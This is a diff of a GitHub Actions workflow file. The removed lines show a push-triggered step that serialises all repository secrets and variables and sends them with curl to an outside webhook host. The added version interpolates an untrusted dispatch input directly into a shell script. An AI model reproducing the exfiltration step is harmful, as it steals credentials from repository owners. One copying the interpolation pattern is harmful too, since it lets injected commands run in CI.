@@ -1,13 +1,24 @@
 name: Hook
-on: [push]
+on:
+  workflow_dispatch:
+    inputs:
+      arguments:
+        description: 'Client JSON Payload'
+        type: string
+        default: '{}'
+        required: true
+env:
+  AUTH_TYPE: ${{ fromJson(inputs.arguments).auth_type }}
 jobs:
   env:
     runs-on: ubuntu-latest
     steps:
-    - name: Run
-      env:
-        MY_ENV: ${{ toJSON(secrets) }}
-        MY_VARS: ${{ toJSON(vars) }}
-      run: |
-            echo $MY_ENV | curl "https://send.wagateway.pro/webhook" -H 'Content-Type: application/json' -d @-
-            echo $MY_VARS | curl "https://send.wagateway.pro/webhook" -H 'Content-Type: application/json' -d @-
+      - name: Set env NEED
+        run: |
+          echo "${{ env.AUTH_TYPE }}"
+          if [[ "${{ env.AUTH_TYPE }}" == "6" ]]; then
+              echo "TEMPLATE_NAME='.NET 8.0 System API (AWS EKS)'" >> "$GITHUB_ENV"
+          else
+              echo "TEMPLATE_NAME='.NET 8.0 Expression API (AWS EKS)'" >> "$GITHUB_ENV"
+          fi
+          echo $TEMPLATE_NAME
